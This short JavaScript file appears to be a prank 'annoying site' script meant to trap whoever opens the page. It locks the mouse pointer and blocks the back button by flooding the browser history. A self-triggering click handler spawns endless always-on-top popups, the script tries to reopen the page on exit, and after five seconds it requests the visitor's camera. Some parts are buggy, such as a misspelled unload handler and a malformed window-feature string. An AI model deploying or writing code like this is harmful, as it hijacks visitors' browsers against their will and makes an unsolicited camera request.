document.getElementById('LULZ').requestPointerLock()
function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // credits to TheAnnoyingSite
  window.history.pushState({}, '', window.location.pathname)
}

blockBackButton()
fillHistory()
son = []

function openWindow(url){
  aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=220,height=240,titlebar=no,alwaysRaised=yes');
  if (!aWindow) return
  son.push(aWindow)
}

function focusWindows(){
  son.forEach(son => {
    if (!son.closed) son.focus()
  })
}

document.getElementById("LULZ").addEventListener('click', e => {
  openWindow('popup.html')
  openWindow('popup.html')
  openWindow('popup.html')
  focusWindows()
  document.getElementById("LULZ").innerHTML = "<H1>:D</H1>"
  document.getElementById("LULZ").click()
  
})

window.onbeforunload = function() {
 window.open(window.location.href) 
}

setTimeout(function() {
  focusWindows()
  navigator.mediaDevices.getUserMedia({video: true})
}, 5000)
